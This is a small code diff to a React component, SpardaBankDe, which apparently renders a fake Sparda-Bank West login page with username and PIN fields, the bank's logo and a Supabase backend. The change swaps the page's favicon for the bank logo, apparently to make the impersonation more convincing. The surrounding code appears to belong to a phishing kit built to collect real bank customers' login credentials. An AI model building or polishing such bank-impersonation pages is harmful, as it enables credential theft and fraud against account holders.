@@ -3,7 +3,6 @@ import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
-import faviconAsset from "@/assets/favicons/spardabank.webp.asset.json";
 import { Eye, EyeOff, ArrowRight, TriangleAlert } from "lucide-react";
 import germanyFlag from "@/assets/germany-flag.svg.asset.json";
 import logoAsset from "@/assets/sparda-logo.avif.asset.json";
@@ -29,7 +28,7 @@ const SpardaBankDe = () => {
   const [pinError, setPinError] = useState(false);
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
-  usePageMeta("Sparda-Bank West - Anmelden", faviconAsset.url);
+  usePageMeta("Sparda-Bank West - Anmelden", logoAsset.url);
 
   const submit = async () => {
     const uErr = username.trim() === "";
